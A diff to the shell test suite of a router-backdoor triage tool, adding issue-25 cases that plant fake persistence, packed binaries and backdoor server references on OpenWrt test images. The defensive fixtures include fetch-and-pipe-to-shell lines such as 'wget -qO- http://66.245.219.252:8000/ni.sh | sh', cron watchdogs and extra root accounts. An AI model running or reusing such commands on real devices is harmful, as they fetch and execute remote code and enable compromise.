@@ -22,6 +22,10 @@ expect() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }
 #   TRIAGE_SH="busybox sh" TRIAGE_PATH=/path/to/busybox-applets unshare -rm bash tests/run-tests.sh
 TRIAGE_SH=${TRIAGE_SH:-sh}
 TRIAGE_PATH=${TRIAGE_PATH:-$PATH}
+# A netstat link counts as the installer's only when it was made while the attack ran
+# (issue 25). The links the tests make carry today's time, so the window ends later here;
+# the test of the window itself unsets this.
+export GL_TRIAGE_ATTACK_UNTIL='2100-01-01 00:00:00 UTC'
 # shellcheck disable=SC2086 # TRIAGE_SH may be two words ("busybox sh")
 triage() { env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" "$@"; }
 if [ "$TRIAGE_PATH" = "$PATH" ]; then echo "script runs with: $TRIAGE_SH, the tools of this machine"; else echo "script runs with: $TRIAGE_SH, tools only from $TRIAGE_PATH"; fi
@@ -975,6 +979,74 @@ run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 expect "another file that names a server of the backdoor is still IOC" '[ $rc = 1 ] && grep -q "IOC  *backdoor-host  */etc/config/other.sh" "$D/check.txt"'
 umount "$D/m"
 
+echo "=== issue 25: the lines of a copy hide no start; names; a list of directories"
+D=$(mkscen i25 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d" "$U/etc/crontabs" "$U/etc/config"
+# rc.local in the very shape of a copy: shell line, the name in line 4, VERSION, IOC_RE, BD_HOST_RE
+printf '#!/bin/sh\n# x\n#\n# gl-helper-triage.sh - triage for x\nVERSION=9.9\nBD_HOST_RE=x\nIOC_RE=x\n/etc/config/.gl/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
+printf '#!/bin/sh\n# gl-helper-triage.sh - triage for x\nBD_HOST_RE=x\nIOC_RE=x\n/etc/glinet/.cache/eco.tmp &\n' >"$U/etc/init.d/fake-copy"
+printf '*/3 * * * * /bin/sh /etc/glinet/.cache/.rk1\n' >"$U/etc/crontabs/root"
+printf '/etc/my-own-file\n/userdata/.gl\n' >"$U/etc/sysupgrade.conf"
+printf '#!/bin/sh\nDIRS="/etc/config/.gl /tmp/.gl"\nfor d in $DIRS; do rm -rf "$d"; done\n' >"$U/etc/init.d/my-cleanup"
+printf '#!/bin/sh\nH=cdn.adguardns.com\nwget -qO- http://cdn.adguardns.com/x | sh\n' >"$U/etc/config/fetch.sh"
+{ cat "$T"; printf 'wget -qO- http://cdn.adguardns.com/x | sh\n'; } >"$U/etc/config/gl-helper-triage.sh"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "the lines of a copy in rc.local and an init script hide no start: IOC persist-ref" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/fake-copy" "$D/check.txt" && ! grep -qE "script-copy  */etc/(rc.local|init.d/fake-copy)" "$D/check.txt"'
+expect "a copy with a line that fetches from a backdoor server is IOC backdoor-host" 'grep -q "IOC  *backdoor-host  */etc/config/gl-helper-triage.sh" "$D/check.txt" && grep -q "IOC  *backdoor-host  */etc/config/fetch.sh" "$D/check.txt"'
+expect ".rk1 in a crontab and /userdata/.gl without a slash in a keep list are IOC" 'grep -q "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" && grep -q "IOC  *keep-ref  */etc/sysupgrade.conf" "$D/check.txt"'
+expect "a variable that lists the directories starts nothing: REVIEW path-ref, no IOC" '! grep -q "IOC  *[a-z-]*  */etc/init.d/my-cleanup" "$D/check.txt" && grep -q "REVIEW  *path-ref  */etc/init.d/my-cleanup" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== issue 25: no overlay and no base image"
+NB=$BASE/nobase; mkdir -p "$NB/etc/init.d" "$NB/etc/hotplug.d/iface" "$NB/lib/upgrade/keep.d" "$NB/overlay/.gl" "$NB/userdata/.gl" "$NB/usr/lib/opkg/info" "$NB/out"
+echo "DISTRIB_ID='OpenWrt'" >"$NB/etc/openwrt_release"
+printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$NB/etc/init.d/S99x"
+# owned by a package: without a base image that says nothing, it is read all the same
+printf '/etc/init.d/S99x\n/etc/init.d/vendor-clean\n' >"$NB/usr/lib/opkg/info/base-files.list"
+printf '#!/bin/sh\nwget -qO- http://66.245.219.252:8000/ni.sh | sh\n' >"$NB/etc/hotplug.d/iface/99-y"
+printf '/etc/config/network\n/etc/config/.gl/\n' >"$NB/lib/upgrade/keep.d/z"
+printf '#!/bin/sh\nrm -rf /etc/config/.gl /etc/glinet/.cache\n' >"$NB/etc/init.d/vendor-clean"
+printf '#!/bin/sh\necho hi\n' >"$NB/etc/init.d/plain"
+{ printf '\177ELF'; head -c 2000 /dev/zero | tr '\0' x; printf 'Node hardened executable packer; format NPK2'; } >"$NB/overlay/.gl/renamed"
+echo note >"$NB/userdata/.gl/unknown"
+triage --root "$NB" -o "$NB/out" --check >"$NB/check.txt" 2>&1; rc=$?
+grep -E '^ +(IOC|REVIEW) |NOTE' "$NB/check.txt"
+expect "without a base image autostart places are read: init script, hotplug, keep list are IOC" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/S99x" "$NB/check.txt" && grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/99-y" "$NB/check.txt" && grep -q "IOC  *keep-ref  */lib/upgrade/keep.d/z" "$NB/check.txt"'
+expect "the firmware's own clean-up and other files are not listed, and the note says why" '! grep -qE "/etc/init.d/(vendor-clean|plain)" "$NB/check.txt" && grep -q "NOTE: no overlay and no base image found" "$NB/check.txt"'
+expect "the malware's directories outside the upper layer: a program by its packer is IOC, an unknown file REVIEW" 'grep -q "IOC  *marker  */overlay/.gl/renamed" "$NB/check.txt" && grep -q "REVIEW  *hidden-dir  */userdata/.gl" "$NB/check.txt"'
+triage --root "$NB" -o "$NB/out" --fix >"$NB/fix.txt" 2>&1; rc=$?
+expect "--fix without a base image takes out only the malware's lines and its directory" '[ $rc = 2 ] && [ ! -e "$NB/overlay/.gl" ] && ! grep -q /etc/config/.gl "$NB/etc/init.d/S99x" && ! grep -q 66.245 "$NB/etc/hotplug.d/iface/99-y" && grep -qx /etc/config/network "$NB/lib/upgrade/keep.d/z" && ! grep -q "\.gl" "$NB/lib/upgrade/keep.d/z" && [ -f "$NB/etc/init.d/vendor-clean" ]'
+
+echo "=== issue 25: /tmp, the spool crontab, rtty_conf, the state file, a late netstat link"
+D=$(mkscen i25b "$OWL"); U=$D/u
+mkdir -p "$U/tmp/.wl" "$U/var/spool/cron/crontabs" "$U/etc/config" "$U/usr/bin"
+: >"$U/tmp/.bt"; : >"$U/tmp/rc.local.bak"
+printf '*/3 * * * * /etc/config/.gl/watch.sh\n0 4 * * * /usr/bin/mine\n' >"$U/var/spool/cron/crontabs/root"
+printf '{"servers":["203.0.113.7"],"heartbeat":5,"timeout":0,"tls":false}\n' >"$U/etc/rtty_conf"
+: >"$U/etc/mp_ip_mapping_info"; echo x >"$U/etc/mp_connection_info"; printf "config global 'global'\n\toption enable '0'\n" >"$U/etc/config/mptun"
+touch -d '2026-11-21 10:00:00 UTC' "$U/etc/mp_ip_mapping_info" "$U/etc/mp_connection_info"
+ln -s /bin/busybox "$U/usr/bin/netstat"
+mnt "$D" "$OWL"
+(unset GL_TRIAGE_ATTACK_UNTIL; run "$D" "$OWL" --check) >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "names the installer leaves in /tmp are REVIEW tmp-file" 'for f in .bt .wl rc.local.bak; do grep -q "REVIEW  *tmp-file  */tmp/$f" "$D/check.txt" || exit 1; done'
+expect "the watchdog in busybox crond's own crontab is IOC cron-ref" 'grep -q "IOC  *cron-ref  */var/spool/cron/crontabs/root" "$D/check.txt"'
+expect "rtty_conf with another server is REVIEW and names it" 'grep -A1 "REVIEW  *rtty-conf  */etc/rtty_conf" "$D/check.txt" | grep -q "203.0.113.7" && ! grep -q "rtty-server" "$D/check.txt"'
+expect "an empty state file written with the module's other state files is REVIEW, not cloud-command" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "together with the SD-WAN module" && ! grep -q "cloud-command" "$D/check.txt"'
+expect "a netstat link made after the attack is no installer-trace, it is listed for review" '! grep -q "installer-trace" "$D/check.txt" && grep -q "REVIEW  *new-link  */usr/bin/netstat" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix takes the watchdog out of that crontab and keeps the owner's line" '[ $rc = 2 ] && ! grep -q watch.sh "$D/m/var/spool/cron/crontabs/root" && grep -q /usr/bin/mine "$D/m/var/spool/cron/crontabs/root"'
+umount "$D/m"
+rm "$U/etc/mp_connection_info"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"
+expect "the same state file written on its own is still cloud-command" 'grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt"'
+umount "$D/m"
+bash "$(dirname "$T")/triage-remote.sh" -p >"$BASE/tr.txt" 2>&1; rc=$?
+expect "triage-remote.sh: -p without a value stops with exit 4" '[ $rc = 4 ] && grep -q "needs a value" "$BASE/tr.txt"'
+
 echo "=== what the base image's busybox loads must be the base image's (issue 8)"
 OWB=$BASE/openwrt-rom-libs
 cp -a "$OWL" "$OWB"; mkdir -p "$OWB/lib"
@@ -1105,6 +1177,20 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	live --no-report >"$L/procs4.txt"
 	expect "pidof in \$( ) and a check of a block are REVIEW; an upload, timeout and a second line are IOC" 'grep -q "REVIEW  *process  *5031" "$L/procs4.txt" && grep -q "REVIEW  *process  *5033" "$L/procs4.txt" && ! grep -qE "IOC  *process  *503[13]" "$L/procs4.txt" && (for n in 5032 5034 5035; do grep -q "IOC  *process  *$n" "$L/procs4.txt" || exit 1; done)'
 	rm -r "$L"/proc/503?
+	# programs of the malware under other names (issue 25): known by their packer when they
+	# run from a deleted file or a RAM disk, or when the file was found by its packer
+	pk() { { printf '\177ELF'; head -c 2000 /dev/zero | tr '\0' x; printf 'Node hardened executable packer; format NPK2'; } >"$1"; }
+	mkdir -p "$L/etc/glinet/.cache"
+	pk "$L/tmp/kworker (deleted)"; pk "$L/tmp/dnsmasq2"; pk "$L/etc/glinet/.cache/sysd"; printf '\177ELF another program' >"$L/tmp/plain (deleted)"
+	fp 5041 kworker 'kworker\0'; ln -sfn "/tmp/kworker (deleted)" "$L/proc/5041/exe"
+	fp 5042 dnsmasq 'dnsmasq\0-k\0'; ln -sfn /tmp/dnsmasq2 "$L/proc/5042/exe"
+	fp 5043 sysd 'sysd\0'; ln -sfn /etc/glinet/.cache/sysd "$L/proc/5043/exe"
+	fp 5044 plain 'plain\0'; ln -sfn "/tmp/plain (deleted)" "$L/proc/5044/exe"
+	live --no-report >"$L/procs5.txt"
+	grep -E '^ +(IOC|REVIEW) ' "$L/procs5.txt"
+	expect "a packed program from a deleted file, from /tmp and from a file found by its packer is IOC process" '(for n in 5041 5042 5043; do grep -q "IOC  *process  *$n" "$L/procs5.txt" || exit 1; done) && grep -q "IOC  *marker  */etc/glinet/.cache/sysd" "$L/procs5.txt"'
+	expect "another program from a deleted file stays REVIEW deleted-exe" 'grep -q "REVIEW  *deleted-exe  *5044" "$L/procs5.txt" && ! grep -q "IOC  *process  *5044" "$L/procs5.txt"'
+	rm -r "$L"/proc/504? "$L/etc/glinet"; rm -f "$L/tmp/kworker (deleted)" "$L/tmp/dnsmasq2" "$L/tmp/plain (deleted)"
 	# The report keeps the owner's lines and names, and says so in bold before it asks
 	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\niptables -I FORWARD -s 192.168.8.60 -d 65.20.71.131 -j DROP\niptables -t nat -A PREROUTING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1\nexit 0\n' >"$L/etc/rc.local"
 	{ printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n'; for n in 1 2 3 4 5 6 7 8; do printf 'zz%s:x:0:0::/root:/bin/ash\n' "$n"; done; } >"$L/etc/passwd"
